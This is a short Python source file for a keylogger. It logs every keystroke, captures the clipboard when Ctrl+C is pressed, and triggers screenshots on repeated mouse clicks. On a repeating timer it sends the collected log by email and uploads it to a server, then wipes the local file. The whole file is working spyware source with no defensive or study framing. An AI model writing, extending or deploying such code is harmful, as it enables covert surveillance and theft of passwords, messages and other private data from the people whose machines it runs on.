import os 
import pynput 
import data
import threading
import email_send
import ss
import pyperclip
import upload

mouse_click = 0
last_key = 0

log_file = os.environ.get(
	'pylogger_file', 
	os.path.expanduser(data.path) 
) 

if not os.path.exists(log_file):
  		open(log_file, 'w').close()

def email_threading():
	try:
		email_send.send_data()
		upload.upload_file(log_file)
	except:
		with open(log_file, 'a') as f:
			f.write("Unable to send data to the server or the email. Please check\n")
	if os.path.exists(log_file):
  		open(log_file, 'w').close()
	t = threading.Timer(data.time_seconds, email_threading)
	t.start()

email_threading()

def OnKeyPress(key):
	global mouse_click
	global last_key 
	with open(log_file, 'a') as f:
		try:
			if last_key == pynput.keyboard.Key.ctrl and key.char == 'c':
				f.write(f"Clipboard - {pyperclip.paste()} \n")
		except:
			pass
		f.write(f"{key} \n")	
		mouse_click = 0
		last_key = key

def OnKeyRelease(key):
	pass

def OnMouseClick(x, y, button, pressed):
	global mouse_click
	if pressed:
		if button == mouse_click:
			s = threading.Timer(data.time_seconds_ss, ss.takeScreenshot)
			s.start()
			mouse_click = 0
		else:
			mouse_click = button

def OnScroll(x,y,dx,dy):
	pass

def OnMove(x,y):
	pass

with pynput.mouse.Listener(on_move=OnMove, on_click=OnMouseClick, on_scroll=OnScroll) as listener:
	with pynput.keyboard.Listener(on_press = OnKeyPress, 
			  on_release = OnKeyRelease) as listener: 
		listener.join()


